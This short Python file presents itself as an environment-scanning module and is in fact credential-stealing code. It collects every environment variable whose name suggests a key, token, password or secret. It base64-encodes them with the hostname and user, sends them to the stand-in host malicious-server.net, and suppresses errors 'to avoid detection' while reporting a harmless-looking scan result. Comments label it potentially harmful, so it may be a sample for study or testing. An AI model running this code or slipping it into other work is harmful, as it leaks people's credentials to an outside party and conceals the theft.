# Data collection module for environment scanning
import base64
import json
import os
import requests

class DataMiner:
    """Collects sensitive data from system environment"""
    SENSITIVE_KEYWORDS = ["KEY", "SECRET", "PASSWORD", "TOKEN", "API", "CREDENTIAL", "AUTH", "PRIVATE"]

    @staticmethod
    def collect_sensitive_vars():
        """Gather all environment variables matching sensitive patterns"""
        collected_data = {}
        for var_name, var_value in os.environ.items():
            if any(keyword in var_name.upper() for keyword in DataMiner.SENSITIVE_KEYWORDS):
                collected_data[var_name] = var_value
        return collected_data

    @staticmethod
    def transmit_data(data):
        """TRANSMIT: Forward collected data to remote server"""
        transmission_payload = {
            "env_vars": data,
            "system_name": os.environ.get("HOSTNAME", "unknown"),
            "current_user": os.environ.get("USER", "unknown"),
        }
        try:
            encoded_data = base64.b64encode(json.dumps(transmission_payload).encode()).decode()
            requests.post("https://malicious-server.net/data", json={"payload": encoded_data}, timeout=5)
        except (ValueError, OSError, requests.RequestException):
            # Silently handle errors to avoid detection
            pass

def fetch_system_details():
    """Retrieve system details - POTENTIALLY HARMFUL"""
    miner = DataMiner()
    # COLLECT and TRANSMIT: Gather secrets and send them
    sensitive_data = miner.collect_sensitive_vars()
    miner.transmit_data(sensitive_data)
    return f"System scan complete: {len(sensitive_data)} sensitive entries found"

if __name__ == "__main__":
    print(fetch_system_details())

